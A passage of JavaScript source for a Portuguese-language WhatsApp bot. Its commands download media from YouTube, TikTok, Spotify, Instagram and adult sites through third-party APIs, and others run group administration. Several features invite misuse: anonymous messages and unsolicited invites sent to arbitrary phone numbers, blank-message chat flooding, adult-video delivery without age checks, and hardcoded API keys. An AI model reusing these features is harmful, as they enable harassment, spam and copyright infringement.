{url:`https://api.cariflex.xyz/api/downloads/youtube/mp3?url=${api2.resultado[0].url}` },
fileName: api2.resultado[0].title + '.mpeg',
mimetype: "audio/mpeg",
contextInfo: {
externalAdReply: {
title: api2.resultado[0].title,
body: `⌗ ᴄᴀʀɪғʟᴇx ᴀ ᴍᴇʟʜᴏʀ ⌗`,
mediaType: 1,
reviewType: "PHOTO",
thumbnailUrl: api2.resultado[0].image,
showAdAttribution: true,
renderLargerThumbnail: true,
},
},
},
{quoted: info });

} catch (error) {
console.log(error);
reply("Deu erro na solicitação");
}
break;
 
case 'play5':
if(!q) return reply(`informe o nome da música`)
reagir (from, "🆙") 
try {

let api5 = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${q}`)

ytbrt = `❯❯    BOT - DOWNLOAD   ❮❮
❐ Titulo: ${api5.resultado[0].title}
❐ Canal: ${api5.resultado[0].autor || "indefinido"}
❐ Duração: ${api5.resultado[0].seconds}
❐ Descrição: ${api5.resultado[0].description}`

await amy.sendMessage(from,
{image: 
{url: `${api5.resultado[0].image}`}, 
caption: ytbrt},
{quoted: info})

await amy.sendMessage(from,
{audio: 
{url: `https://api.cariflex.xyz/api/downloads/youtube/mp3?url=${api5.resultado[0].url}` },
mimetype: "audio/mpeg"},
{quoted: info})

} catch (erro) {
reply("Nao foi possível encontrar o audio da música.")
console.log(erro)
}
break

case 'play6':
if(!q) return reply(`nome da musica`)
reagir(from, "🆙") 
await sleep(300) 
music = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${q}`)
await amy.sendMessage(from, { audio: { url: `https://api.cariflex.xyz/api/downloads/youtube/mp3?url=${music.resultado[0].url}` }, mimetype: "audio/mpeg",
headerType: 4,
contextInfo: {
externalAdReply: {
title: `${pushname}`,
body: `${music.resultado[0].title}`,
showAdAttribution: true,
thumbnail: await getBuffer(`https://i.imgur.com/LDFQyt2.jpeg`),
mediaType: 2,
mediaUrl: `https://api.cariflex.xyz`,
sourceUrl: `https://api.cariflex.xyz`}}},{quoted: info}).catch(e => {
reply("Nao foi possível encontrar o audio da música.")
})
break

case 'play7':
reagir(from, "🆙")
if(!q) return reply(`Exemplo: ${prefix}play nome da música`)

api = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${q}`)

await amy.sendMessage(from,
{audio: 
{url:`https://api.cariflex.xyz/api/downloads/youtube/mp3-2?url=${api.resultado[0].url}`},
mimetype: "audio/mpeg"}, 
{quoted: info}).catch(e => {
reagir(from, "❌")
})
break

case 'playvideo':
if(!q) return reply('Cade o nome?');
await reagir(from, "💫");

datinha = (await yts(q)).videos[0];
dir = await ytvdl(datinha.id);

try {
await amy.sendMessage(from,
{video: fs.readFileSync(dir), 
mimetype: 'video/mp4'}, 
{quoted: info});

} catch(e) {
if(String(e).includes('ENOSPC')) {
await reply(`Download finalizado, como o arquivo é muito pesado irei reply em documento, aguarde.`)
try {
await amy.sendMessage(from,
{document: fs.readFileSync(dir),
mimetype: 'video/mp4',
fileName: `${datinha.title.text}.mp4`}, 
{quoted: info});
} catch(e) {
console.log(e);
await reply(`Ocorreu um erro ao reply o audio :/`);
}
} else {
console.log(e);
await reply(`Ocorreu um erro ao reply o audio :/`);
}
}
await cleanup(dir)
break

case 'play_video':
case 'Play_video':

try {

if(!q) return reply(`Coloque o nome do video`)

let api = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${q}`)

await amy.sendMessage(from, 
{video: 
{url: `https://api.cariflex.xyz/api/downloads/youtube/mp4?url=${api.resultado[0].url}`},
mimetype: "video/mp4"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break

case 'videoall':

try {

if(!q) return reply(`Cade o link do video ?`)

await amy.sendMessage(from,
{video:
{url: `https://modulos.cariflex.xyz/api/downloads/alldl/mp4?url=${q}`}, 
mimetype: "video/mp4"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break

case 'audioall':
if(!q) return reply(`Cade o link do video ?`)
reagir(from, "🆙")

await amy.sendMessage(from,
{audio:
{url: `https://modulos.cariflex.xyz/api/downloads/alldl/audio?url=${q}`}, 
mimetype: "audio/mpeg"}, 
{quoted: info}).catch(e => {
reagir(from, "❌")
})
break

case 'ytmp4':

try {

if(!q) return reply(`Cade o link do video ?`)

reply(" Baixando o vídeo solicitado.. ") 

await amy.sendMessage(from,
{video:
{url: `https://api.cariflex.xyz/api/downloads/youtube/mp4-2?url=${q}`}, 
mimetype: "video/mp4"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break

case 'ytmp3':

try {

if(!q) return reply(`Cade o link do áudio?`)

reply(" Baixando o áudio solicitado.. ")

await amy.sendMessage(from, 
{audio: 
{url: `https://api.cariflex.xyz/api/downloads/youtube/mp3-2?url=${q}`}, 
mimetype: "audio/mpeg"},
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break 


case 'spotifymp3': 
case 'Spotifymp3': 
if(!q) return reply(`Cade o link do áudio?`)
reagir(from, `🆙`)

await amy.sendMessage(from,
{audio: 
{url: `https://api.cariflex.xyz/api/downloads/spotify/dl?url=${q}`}, 
mimetype: "audio/mpeg"},
{quoted: info}).catch(err => {
console.log(err)
reply("Ocorreu um erro")
})
break 

case 'drive_video':
case 'drivemp4':
if(!q) return reply(`cade o link do drive?`);
reagir(from, "🆙");
try {

await amy.sendMessage(from, 
{video: 
{url: `https://api.cariflex.xyz/api/downloads/googledrive/mp4?url=${q}`}, 
mimetype: "video/mp4"}, 
{quoted: info})

} catch (e) {
reply("ocorreu um erro")
}
break;

case 'kwai_video':
case 'kwaimp4':
if(!q) return reply(`cade o link do kwai?`);
try {
reply("estou baixando o video")
await amy.sendMessage(from, 
{video: 
{url: `https://api.cariflex.xyz/api/downloads/kwai/mp4?url=${q}`}, 
mimetype: "video/mp4"}, 
{quoted: info})
} catch (e) {
reply("ocorreu um erro")
}
break;

case 'kwai_audio':
case 'kwaimp3':
if(!q) return reply(`cade o link do kwai?`);
try {
reply("estou baixando o audio")
await amy.sendMessage(from, 
{video: 
{url: `https://api.cariflex.xyz/api/downloads/kwai/mp3?url=${q}`}, 
mimetype: "audio/mpeg"}, 
{quoted: info})
} catch (e) {
reply("ocorreu um erro")
}
break;

case 'twitteri_video':
case 'twittermp4':
if(!q) return reply(`cade o link do twitter?`);
try {
reply("estou baixando o video")
await amy.sendMessage(from, 
{video: 
{url: `https://api.cariflex.xyz/api/downloads/twitter/mp4?url=${q}`}, 
mimetype: "video/mp4"}, 
{quoted: info})
} catch (e) {
reply("ocorreu um erro")
}
break;

case 'twitter_audio':
case 'twittermp3':

if(!q) return reply(`cade o link do twitter?`);

try {

reply("estou baixando o audio")

await amy.sendMessage(from, 
{video: 
{url: `https://api.cariflex.xyz/api/downloads/twitter/mp3?url=${q}`}, 
mimetype: "audio/mpeg"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break;


case 'playdl':
if(!q) return reply(`Exemplo: ${prefix}playdl nome da música audio ou ${prefix}playdl nome do video vídeo`);

const partes = q.trim().split(" ");
const tipo = partes.pop().toLowerCase();
const musica = partes.join(" ");

if (!tipo || (tipo !== "audio" && tipo !== "video")) {
return reply(`Por favor, escolha entre "áudio" ou "vídeo" após o nome da música. Exemplo: ${prefix}playdl nome da música audio ou ${prefix}playdl nome do vídeo video.`);
}
//feito por Crician JS, nao tire os créditos.. 
try {

let api = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${encodeURIComponent(musica)}`);

if(tipo === "audio") {
reply(`Baixando o ${tipo} para você, aguarde um pouquinho...`);

await amy.sendMessage(from,
{audio: 
{url:`https://api.cariflex.xyz/api/downloads/youtube/mp3?url=${api.resultado[0].url}` },
mimetype: "audio/mpeg",
},
{quoted: info }).catch(e => {
console.error(e);
reply("Ocorreu um erro ao reply a música.");
});
        
} else if (tipo === "video") {
reply(`Baixando o ${tipo} para você, aguarde um pouquinho...`);

await amy.sendMessage(from,
{video: 
{url:`https://api.cariflex.xyz/api/downloads/youtube/mp4?url=${api.resultado[0].url}`},
mimetype: "video/mp4",
},
{quoted: info }).catch(e => {
console.error(e);
reply("Ocorreu um erro ao reply o vídeo.");
});
}

} catch (e) {
console.error(e);
return reply("Ocorreu um erro ao buscar a música. Tente novamente mais tarde.");
}
break;

case 'tiktokmp4':
case 'Tiktokmp4':

try {

reagir(from, "🆙")

if(!q.includes("tiktok")) return reply(`${prefix+command} link do Tiktok`);

await amy.sendMessage(from, 
{video: 
{url:`https://api.cariflex.xyz/api/downloads/tiktok/mp4?url=${q}`}, 
mimetype: "video/mp4"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break;

case 'tiktokmp3':
case 'Tiktokmp3':

try {

reagir(from, "🆙") 

if(!q.includes("tiktok")) return reply(`${prefix+command} link do Tiktok`)

await amy.sendMessage(from, 
{audio: 
{url:`https://api.cariflex.xyz/api/downloads/tiktok/mp3?url=${q}`},
mimetype: "audio/mpeg"},
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break;

case 'tiktok_video':
case 'tiktokvideo':

try {

reagir(from, "🆙")

if(!q.includes("tiktok")) return reply(`${prefix+command} link do Tiktok`);

let api = await fetchJson(`https://api.cariflex.xyz/api/downloads/tiktok/url?url=${q}`)

await amy.sendMessage(from, 
{video:
{url:`${api.resultado.url}`}, 
mimetype: "video/mp4"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break;

case 'tiktok_audio':
case 'tiktokaudio':
try {

reagir(from, "🆙") 

if(!q.includes("tiktok")) return reply(`${prefix+command} link do Tiktok`);

let api = await fetchJson(`https://api.cariflex.xyz/api/downloads/tiktok/url?url=${q}`)

await amy.sendMessage(from, 
{audio: 
{url:`${api.resultado.url}`}, 
mimetype: "audio/mpeg"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break

case 'instamp3':

try {

if(!q) return reply("adicione o link de Instagram para baixar") 

reagir(from, "🆙")

await amy.sendMessage(from, 
{audio: 
{url:`https://api.cariflex.xyz/api/downloads/instagram/mp3?url=${q}`}, 
mimetype: "audio/mpeg"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break

case 'instagram2':
case 'instavideo2':
case 'instafoto2':
  try {
    if (!q) {
      return amy.sendMessage(from, { text: 'Digite o link' }, { quoted: info });
    }
    const resp = await instagramDl(q);
    console.log(resp)
    const mediaLinks = [...resp.video, ...resp.foto];
    for (const link of mediaLinks) {
      try {
        const { data, headers } = await axios.get(link, { responseType: 'arraybuffer' });
        const contentType = headers['content-type'];
        if (contentType.startsWith('image/')) {
        await amy.sendMessage(from, { image: data }, { quoted: info });
        } else {
          await amy.sendMessage(from, { video: data }, { quoted: info });
        }
      } catch (err) {
        console.error('Erro ao baixar ou reply mídia:', err);
      }
    }
  } catch (e) {
    console.error('Erro ao processar a solicitação:', e);
    await amy.sendMessage(from, { text: e}, { quoted: info });
  }
  break;
  
case 'instadl':
reagir(from, "💗")
if(!q) return reply(`Coloque o link do Instagram`);

api = await getBuffer(`https://api.cariflex.xyz/api/instagram/dl?url=${q}&apikey=cariflex-key`)

await amy.sendMessage(from, 
{video: 
{url:`${api.url}`}, 
mimetype: "video/mp4"}, 
{quoted: info}).catch(e => {
console.log(e)
reagir(from, "❌")
})
break

case 'instamp4':

try {

reagir(from, "💗")

if(!q) return reply(`Coloque o link do Instagram`);

await amy.sendMessage(from, 
{video: 
{url:`https://api.cariflex.xyz/api/downloads/instagram/mp4?url=${q}`}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break

case 'pintemp3':

try {

if(!q) return reply("adicione o link de pinterest para baixar")

reagir(from, "🆙")

await amy.sendMessage(from, 
{audio: 
{url:`https://api.cariflex.xyz/api/downloads/pinterest/mp3?url=${q}`}, 
mimetype: "audio/mpeg"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break

case 'pintemp4':

try {

if(!q) return reply("adicione o link de pinterest para baixar")

reagir(from, "🆙")

await amy.sendMessage(from, 
{video: 
{url:`https://api.cariflex.xyz/api/downloads/pinterest/mp4?url=${q}`},
mimetype: "video/mp4"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break

case 'facemp4':

try {

if(!q) return reply("adicione o link de Facebook para baixar")

reagir(from, "🆙")

await amy.sendMessage(from, 
{video: 
{url:`https://api.cariflex.xyz/api/donwloads/facebook/mp4?url=${q}`},
mimetype: "video/mp4"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break

case 'facemp3':

try {

if(!q) return reply("adicione o link de Facebook para baixar")

reagir(from, "🆙")

await amy.sendMessage(from, 
{audio: 
{url:`https://api.cariflex.xyz/api/downloads/facebook/mp3?url=${q}`}, 
mimetype: "audio/mpeg"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break




case 'playmix':
if(!q) return reply(`informe o titulo da música`)
reagir(from, "🆙")
api = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${q}`)
capimg = await getBuffer(api.resultado[0].image)
bla = `💖⃤  AMY BOT - DOWNLOAD  - MIX  💖⃤ 
🌹⃤ ➳ 𝚃𝙸𝚃𝚄𝙻𝙾 ⧽: ${api.resultado[0].title}
👁⃤ ➳ 𝚅𝙸𝙴𝚆𝚂 ⧽ ${api.resultado[0].views}
⏰⃤ ➳ 𝚃𝙴𝙼𝙿𝙾 ⧽ ${api.resultado[0].timestamp}
💖⃤ ➳ 𝙳𝙴𝚂𝙲𝚁𝙸𝙲̧𝙰̃𝙾 ${api.resultado[0].description}
0:00 ━❍──────< ${api.resultado[0].seconds}`
amy.sendMessage(from,  {image: capimg, caption: bla}, {quoted: info})
await sleep(100);
await amy.sendMessage(from, {audio: {url: `https://api.cariflex.xyz/api/youtube/mp3?url=${api.resultado[0].url}` }, mimetype: "audio/mpeg"}, {quoted: info});
await sleep(1000);
await amy.sendMessage(from, {audio: {url: `https://api.cariflex.xyz/api/youtube/mp3?url=${api.resultado[1].url}` }, mimetype: "audio/mpeg"}, {quoted: info});
await sleep(2000);
await amy.sendMessage(from, {audio: {url: `https://api.cariflex.xyz/api/youtube/mp3?url=${api.resultado[2].url}` }, mimetype: "audio/mpeg"}, {quoted: info});
await sleep(3000);
await amy.sendMessage(from, {audio: {url: `https://api.cariflex.xyz/api/youtube/mp3?url=${api.resultado[3].url}` }, mimetype: "audio/mpeg"}, {quoted: info});
break


case 'Spotify2': case 'spotify2':
reagir(from, "🆙")
if(!q) return reply(`Exemplo: ${prefix}Spotify nome da música`)
api = await fetchJson(`https://api.cariflex.xyz/api/spotifysearch?query=${q}`)
bla = ` 🌹 ➳ 𝚃𝙸𝚃𝚄𝙻𝙾 ⧽: ${api.tracksArray[0].title}
👁 ➳ 𝙸𝙳 ⧽ ${api.tracksArray[0].id}
⏰ ➳ 𝚃𝙴𝙼𝙿𝙾 ⧽ ${api.tracksArray[0].duration}
0:00 ━❍──────< ${api.tracksArray[0].duration} ↻ ⊲ Ⅱ ⊳ ↺ VOLUME:`
await amy.sendMessage(from,{image:{url: `${api.tracksArray[0].thumb}`}, caption: bla},{quoted: info})
await amy.sendMessage(from, {audio: {url:`https://api.cariflex.xyz/api/downloads/spotify/dl?url=${api.tracksArray[0].url}`}, mimetype: "audio/mpeg"}, {quoted: info}).catch(e => {
reagir(from, "❌")
})
break

case 'Spotify': case 'spotify':
setTimeout(() => {reagir(from, "🆙")}, 300)
try {
if(!q) return reply(`${prefix+command} nome da música`)
api = await fetchJson(`https://api.cariflex.xyz/api/spotifysearch?query=${q}`)
await amy.sendMessage(from, {audio: {url: `https://api.cariflex.xyz/api/downloads/spotify/dl?url=${api.tracksArray[0].url}`}, fileName: api.tracksArray[0].title+'.m4a', mimetype: "audio/mpeg", contextInfo: {
externalAdReply: {
title: api.tracksArray[0].title,
body: `0:00 ━❍────────-${api.tracksArray[0].duration || "indefinido"} ↻ ⊲ Ⅱ ⊳ ↺`,
mediaType: 1,
reviewType: "PHOTO", 
thumbnailUrl: api.tracksArray[0].thumb,
showAdAttribution: true,
renderLargerThumbnail: true,
}}}, {quoted: info}).catch(e => {
reagir(from, "❌") 
})
} catch (e) {
reagir(from,"❌") 
}

break;

case 'download-link':
reagir(from, "🆙") 
if(q.includes("video") || q.includes("mp4")) {
amy.sendMessage(from, {video: {url: q}, mimetype: 'video/mp4'}, {quoted: info}).catch(e => {
reply("Erro, visualize se este link é válido...")
})
} else if(q.includes("webp") || q.includes("jpg")) {
amy.sendMessage(from, {image: {url: q}}, {quoted: info}).catch(e => {
reagir(from, "❌")
})
}
break

case 'face_video':
try {
if(!q) return reply(`Exemplo: ${prefix+command} o link do Facebook`);
reagir(from, "🆙")
const facev = await fetchJson(`https://tohsaka.tech/download/facebook?query=${q}&apitoken=xReis`)
amy.sendMessage(from, {video: {url: `https://api.cafirexos.com/api/facebook?url${facev.resultado[0].down_link}`}, mimetype: "video/mp4"}, { quoted: info})
} catch (erro) {
reagir(from, "❌")
console.log(erro)
}
break

case 'face_audio':
try {
reagir(from, "🆙")
if(!q) return reply(`Exemplo: ${prefix+command} o link do Facebook`);
const facea = await fetchJson(`https://tohsaka.tech/download/facebook?query=${q}&apitoken=
xReis`)
amy.sendMessage(from, {audio: {url: `https://api.cafirexos.com/api/facebook?url${facea.resultado[0].down_link}`}, mimetype: "audio/mpeg"}).catch(e => {
reagir(from, "❌")
})
} catch (e) {
reagir(from, "❌")
}
break;

case 'capcut': case 'capcutmodel':
if(!q) return reply('Por favor, adicione um link de um modelo do CapCut.')
try {
reagir(from, "🆙")
data = await fetchJson(`https://yoshinofenixbots.online/api/dl/capcut?url=${q}&apikey=SHIPPUDEN`) 
c = await getBuffer(data.resultado.videoOriginal)
amy.sendMessage(from, {video: c, caption: `• *${data.resultado.title} | ${data.resultado.fullUse}*\n• *Desc:* ${data.resultado.description}`}, {quoted: info})
} catch(e) {
reagir(from, "❌")
}
break

case 'Srcxvideos':
case 'srcxvideo':

if(!q) return reply('Por favor, informe o título do video.')

let apii = await fetchJson(`https://api.cariflex.xyz/api/downloads/xvideos/dl?query=${q}`);

await amy.sendMessage(sender, 
{video: 
{url: `${apii.videoUrl}`},
mimetype: 'video/mp4'}, 
{quoted: info}).catch(e => {
reply("Erro ao baixar seu vídeo!")  
})
break

case 'multidl': case 'pocbi':
if(q.length < 5) return reply('Por favor, adicione um link de uma rede social de mídia. (Ex.: Tiktok, insta, threads, etc...)');
try {
setTimeout(() => {reagir(from, "😉")}, 100)
data = await MultiDownload(q)
console.log(data)
for (let i = 0; i < data.medias.length; i++) {
let dmt = data.medias[i].extension
mimety = dmt === "mp4" ? "video/mp4" : dmt === "webp" ? "image/webp" : dmt === "jpg" ? "image/jpeg" : dmt === "mp3" ? "audio/mpeg" : "video/mp4"
amy.sendMessage(from, {[mimety.split("/")[0]]: {url: data.medias[i].url}, mimetype: mimety}, {quoted: info})
}
} catch(e) {
return reply(mess.error())
}
break

case 'module':
if(!q) return reply("coloque um link")
reply("pegando informações do módulo")
let module = await MultiDownload(q)
await reply(module)
break

case 'Srcpornhub':
case 'srcpornhub':
if (!q) return reply('Por favor, informe o título do vídeo.');

try {
let pornhub = await fetchJson(`https://api.cariflex.xyz/api/pesquisa/pornhubsrc?q=${q}`);
reply("Baixando o vídeo solicitado...");
await amy.sendMessage(sender, 
{ 
document: { url: `https://api.cariflex.xyz/api/downloads/pornhub/dl?url=${pornhub.resultado[0].link}` }, 
mimetype: 'video/mp4', 
fileName: `${pornhub.resultado[0].titulo}.mp4` 
}, 
{quoted: info });
} catch (e) {
console.error(e);
reply("Erro ao baixar ou enviar seu vídeo!");  
}
break;

//⌗ PARTE DE ADMINISTRAÇÃO DO BOT ⌗
case 'idgp':
if(!isAdmins) return reply(reply.msg.adm)
reply(`${from}`)
break

case 'linkgp':
case 'linkgroup':
setTimeout(() => {reagir(from, `🆙`)}, 100)
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
await sleep(1000)
linkgc = await amy.groupInviteCode(from)
reply('https://chat.whatsapp.com/'+linkgc)
break

case 'limpar':
setTimeout(() => {reagir(from, "🗑️")}, 300)
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
clear = `ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ
\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ
️`
clear2 = `ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
reply(`*GRUPO FECHADO PARA LIMPEZA* 🗑️`)
amy.groupSettingUpdate(from, 'announcement')
setTimeout(async() => {
amy.sendMessage(from, {text: clear})
}, 1000)//msg 1
setTimeout(async() => {
amy.sendMessage(from, {text: clear})
}, 4000)//msg 2
setTimeout(async() => {
amy.sendMessage(from, {text: clear})
}, 7000)//msg 3
setTimeout(async() => {
amy.sendMessage(from, {text: clear})
}, 10000)// msg 4
setTimeout(async() => {
amy.sendMessage(from, {text: clear})
}, 13000)//msg 5
setTimeout(async() => {
amy.sendMessage(from, {text: clear})
}, 16000)//msg 6
setTimeout(async() => {
amy.sendMessage(from, {text: clear})
}, 19000)//msg 7
setTimeout(async() => {
amy.sendMessage(from, {text: clear})
}, 22000)//msg 8
setTimeout(async() => {
amy.sendMessage(from, {text: clear})
}, 25000)//msg 9
setTimeout(async() => {
amy.sendMessage(from, {text: clear2})
}, 28000)//msg 10
setTimeout(async() => {
amy.sendMessage(from, {text: `*LIMPEZA CONCLUÍDA* ✅`})
amy.groupSettingUpdate(from, 'not_announcement')
}, 30000)
break

case 'limpar2':
setTimeout(() => {reagir(from, "🗑️")}, 300)
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
clearcmd = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
amy.sendMessage(from, {text: clearcmd}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
break

case 'recrutar':
setTimeout(() => {reagir(from, `📩`)}, 100)
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
if(!q) return reply("𝘾𝙖𝙙𝙚̂ 𝙤 𝙣𝙪́𝙢𝙚𝙧𝙤 𝙙𝙤 𝙪𝙨𝙪𝙖́𝙧𝙞𝙤 𝙦𝙪𝙚 𝙫𝙤𝙘𝙚̂ 𝙙𝙚𝙨𝙚𝙟𝙖 𝙘𝙤𝙣𝙫𝙞𝙙𝙖𝙧.")
try {
photoG = await amy.profilePictureUrl(from, 'image')
} catch {
photoG = thumbnail
}
rcrt = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
linkgc = await amy.groupInviteCode(from)
amy.sendMessage(rcrt, {text: "𝙊𝙡𝙖́, 𝙩𝙪𝙙𝙤 𝙗𝙚𝙢? 𝙑𝙤𝙘𝙚̂ 𝙛𝙤𝙞 𝙘𝙤𝙣𝙫𝙞𝙙𝙖𝙙𝙤(𝙖) 𝙥𝙚𝙡𝙤(𝙖) 𝙖𝙙𝙢𝙞𝙣𝙨𝙩𝙧𝙖𝙙𝙤𝙧(𝙖) 𝙙𝙤 𝙜𝙧𝙪𝙥𝙤,𝙋𝙖𝙧𝙖 𝙥𝙖𝙧𝙩𝙞𝙘𝙞𝙥𝙖𝙧 𝙙𝙤 𝙣𝙤𝙨𝙨𝙤 𝙜𝙧𝙪𝙥𝙤,𝙫𝙚𝙣𝙝𝙖 𝙨𝙚 𝙙𝙞𝙫𝙚𝙧𝙩𝙞𝙧 🥰.\n𝙋𝙖𝙧𝙖 𝙚𝙣𝙩𝙧𝙖𝙧 𝙣𝙤 𝙜𝙧𝙪𝙥𝙤, 𝙘𝙡𝙞𝙦𝙪𝙚 𝙖𝙘𝙞𝙢𝙖!", contextInfo: {externalAdReply: {title: "𝘾𝙡𝙞𝙦𝙪𝙚 𝙖𝙦𝙪𝙞 𝙥𝙖𝙧𝙖 𝙥𝙖𝙧𝙩𝙞𝙘𝙞𝙥𝙖𝙧 𝙙𝙤 𝙜𝙧𝙪𝙥𝙤 💞.", thumbnail: await getBuffer(photoG), mediaType: 1, sourceUrl: "https://chat.whatsapp.com/"+linkgc}}})
reply("𝘾𝙤𝙣𝙫𝙞𝙩𝙚 𝙙𝙚 𝙧𝙚𝙘𝙧𝙪𝙩𝙖𝙢𝙚𝙣𝙩𝙤 𝙙𝙤 𝙪𝙨𝙪𝙖́𝙧𝙞𝙤, 𝙛𝙤𝙞 𝙚𝙣𝙫𝙞𝙖𝙙𝙤 𝙥𝙖𝙧𝙖 𝙤 𝙥𝙧𝙞𝙫𝙖𝙙𝙤 𝙙𝙚𝙡𝙚 𝙘𝙤𝙢 𝙨𝙪𝙘𝙚𝙨𝙨𝙤 ✅")
break

case 'correio': {
reagir(from, "💌")
if (!args.join(" ")) return reply(`𝗘𝘅𝗲𝗺𝗽𝗹𝗼 :\n${prefix + command} 559691542453|𝗼𝗶𝗲𝗵, 𝘁𝘂𝗱𝗼 𝗯𝗲𝗺 ?`)
const cpes = args.join(" ")
const nony = cpes.split("|")[0];
const pesny = cpes.split("|")[1];
lolh = `       *| 💌 𝗠𝗦𝗚 𝗖𝗢𝗥𝗥𝗘𝗜𝗢 𝗔𝗠𝗬 💌 |*

• ⊱ ᴍᴇɴsᴀɢᴇᴍ ᴀɴᴏ̂ɴɪᴍᴀ ⊰
​
• ᴍᴇɴsᴀɢᴇᴍ : _[ ${pesny} ]_ `
amy.sendMessage(nony + "@s.whatsapp.net", {text:lolh, mentions:[sender]}, {quoted: live})
}
await reply("𝗠𝗲𝗻𝘀𝗮𝗴𝗲𝗺 𝗲𝗻𝘃𝗶𝗮𝗱𝗮 𝗰𝗼𝗺 𝘀𝘂𝗰𝗲𝘀𝘀𝗼 💌")
break

case 'x9visuunica':
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
if(args.length < 1) return reply(' 1 𝙥𝙧𝙖 𝙡𝙞𝙜𝙖𝙧 / 0 𝙥𝙧𝙖 𝙙𝙚𝙨𝙡𝙞𝙜𝙖𝙧 👩🏻‍💻')
if(Number(args[0]) === 1) {
